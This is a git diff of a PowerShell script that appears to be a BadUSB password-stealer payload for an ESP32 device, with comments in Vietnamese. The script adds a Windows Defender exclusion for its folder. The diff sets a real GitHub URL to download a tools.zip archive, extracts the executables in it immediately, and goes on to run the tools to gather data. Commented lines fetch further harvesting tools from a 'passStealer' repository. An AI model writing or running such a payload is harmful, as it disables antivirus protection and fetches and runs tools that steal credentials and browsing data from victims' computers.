@@ -21,8 +21,10 @@ Add-MpPreference -ExclusionPath $basePath -Force
 # Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/BrowsingHistoryView.exe?raw=true -OutFile BrowsingHistoryView.exe
 # Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WNetWatcher.exe?raw=true -OutFile WNetWatcher.exe
 # Tải duy nhất 1 file
-Invoke-WebRequest "https://link-toi-file-tools.zip" -OutFile "tools.zip"
-# Giải nén ngay lập tức
+$zipUrl = "https://github.com/Sunlaii/ANM-Esp32BadUSB/raw/refs/heads/MinhNhat/tools.zip"
+Invoke-WebRequest $zipUrl -OutFile "tools.zip"
+
+# Giải nén ngay lập tức (các file .exe sẽ tự động bung ra tại thư mục hiện tại)
 Expand-Archive -Path "tools.zip" -DestinationPath "." -Force
 
 # Execute tools to gather data
